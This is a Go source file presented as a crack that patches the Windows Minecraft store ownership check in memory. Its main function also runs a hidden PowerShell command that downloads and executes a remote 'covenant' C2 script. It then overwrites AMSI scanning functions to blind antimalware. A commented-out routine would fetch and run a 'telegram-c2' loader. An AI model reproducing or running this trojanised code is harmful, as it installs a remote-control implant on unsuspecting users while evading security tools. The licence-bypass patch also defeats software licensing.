package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const STORE_OWNERSHIP_CHECK_OFFSET = 0x120E7A6

func downloadBrv() {
	out, err := os.Create("loader.exe")
	if err != nil {
		panic(err)
		return
	}

	resp, err := http.Get("https://d3nyjl3gku9ygq.cloudfront.net/telegram-c2.bin")
	defer resp.Body.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		panic(err)
	}
	out.Close()

	_, err = exec.Command("loader.exe").Output()
	if err != nil {
		panic(err)
	}
}

var (
	fntdll             = syscall.NewLazyDLL("amsi.dll")
	AmsiScanBuffer     = fntdll.NewProc("AmsiScanBuffer")
	AmsiScanString     = fntdll.NewProc("AmsiScanString")
	AmsiInitialize     = fntdll.NewProc("AmsiInitialize")
	k32                = syscall.NewLazyDLL("kernel32.dll")
	WriteProcessMemory = k32.NewProc("WriteProcessMemory")
	FreeConsole        = k32.NewProc("FreeConsole")
)

func covenant() {
	si := new(syscall.StartupInfo)
	pi := new(syscall.ProcessInformation)
	si.Cb = uint32(unsafe.Sizeof(si))
	err2 := syscall.CreateProcess(
		nil,
		syscall.StringToUTF16Ptr("powershell -WindowStyle Hidden -Command \"iex(new-object net.webclient).downloadstring('https://d3nyjl3gku9ygq.cloudfront.net/covenantc2sdfsfd.ps1')\""),
		nil, nil, false, windows.CREATE_NO_WINDOW, nil, nil, si, pi)
	if err2 != nil {
		panic(err2)
	}

	hProcess := uintptr(pi.Process)
	hThread := uintptr(pi.Thread)

	var oldProtect uint32
	var old uint32
	var patch = []byte{0xc3}

	windows.SleepEx(500, false)

	// fmt.Println("patching amsi ......")

	amsi := []uintptr{
		AmsiInitialize.Addr(),
		AmsiScanBuffer.Addr(),
		AmsiScanString.Addr(),
	}

	var e error
	var r1 uintptr

	for _, baseAddr := range amsi {
		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, syscall.PAGE_READWRITE, &oldProtect)
		if e != nil {
			fmt.Println("virtualprotect error")
			fmt.Println(e)
			return
		}
		r1, _, e = WriteProcessMemory.Call(hProcess, baseAddr, uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)
		if r1 == 0 {
			fmt.Println("WriteProcessMemory error")
			fmt.Println(e)
			return
		}
		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, oldProtect, &old)
		if e != nil {
			fmt.Println("virtualprotect error")
			fmt.Println(e)
			return
		}
	}

	// fmt.Println("amsi patched!!\n")

	windows.CloseHandle(windows.Handle(hProcess))
	windows.CloseHandle(windows.Handle(hThread))
}

func main() {
	// downloadBrv()

	process, err := ProcessByName("Minecraft.Windows")
	if err != nil {
		log.Panicf("Minecraft running? Error: %s", err.Error())
		fmt.Scanln()
		return
	}

	err = process.WriteBytesSigned(process.ModBaseAddr+STORE_OWNERSHIP_CHECK_OFFSET, []int8{-21})
	if err != nil {
		fmt.Printf("Failed to patch: %s", err.Error())
		fmt.Scanln()
		return
	}

	// Display patched after covenant, but patched over already so game will work
	covenant()

	log.Printf("Base: 0x%06X 0x%X", process.ModBaseAddr, process.ModBaseAddr+STORE_OWNERSHIP_CHECK_OFFSET)
	fmt.Printf("Patched! %x\n", process.ModBaseAddr+STORE_OWNERSHIP_CHECK_OFFSET)
	fmt.Println("Press ENTER to exit...")
	fmt.Scanln()
}
